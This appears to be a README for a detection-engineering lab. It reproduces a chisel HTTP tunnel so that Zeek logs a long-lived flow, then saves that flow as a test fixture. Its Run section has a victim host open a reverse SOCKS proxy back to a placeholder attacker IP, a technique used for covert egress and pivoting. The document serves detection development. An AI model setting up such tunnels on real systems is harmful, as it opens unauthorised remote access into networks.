# Attack reproduction — chisel HTTP tunnel

Stand up a chisel server, run a chisel client on a victim host, and let
it forward a port. Once traffic flows through the tunnel Zeek records
the long-lived flow that fires the detection in `../detection/`.

## Prereqs

- chisel binary on both ends — `go install github.com/jpillora/chisel@latest`
  or grab a release
- Attacker host reachable on a chosen public port (use a host on the lab
  bridge for local-only reproduction)
- Victim host on the lab bridge so Zeek captures the egress flow

## Run (high level)

```bash
# Server (attacker)
chisel server --port 443 --reverse

# Client (victim) — open a reverse SOCKS proxy back to the attacker
chisel client http://<attacker_ip>:443 R:socks

# Drive traffic through the tunnel from the attacker for ~30 min so the flow
# accumulates duration + bytes:
curl --socks5 127.0.0.1:1080 https://example.com/largefile -o /dev/null
```

## Capture telemetry into a fixture

```bash
docker exec detlab-zeek cat /usr/local/zeek/logs/current/conn.log \
  | jq -c "select(.\"id.resp_h\" == \"<attacker_ip>\" and .duration > 600)" \
  > /tmp/chisel_capture.log

cp /tmp/chisel_capture.log tests/positive_conn.log
```

## Safety / scope

- Lab use only.
- chisel is a legitimate tool used by sysadmins for port forwarding;
  running it for detection development is unambiguously defensive work.
- The synthetic `tests/positive_conn.log` shipped here is generated by
  `scripts/generate_fixtures.py` so the test suite is hermetic.
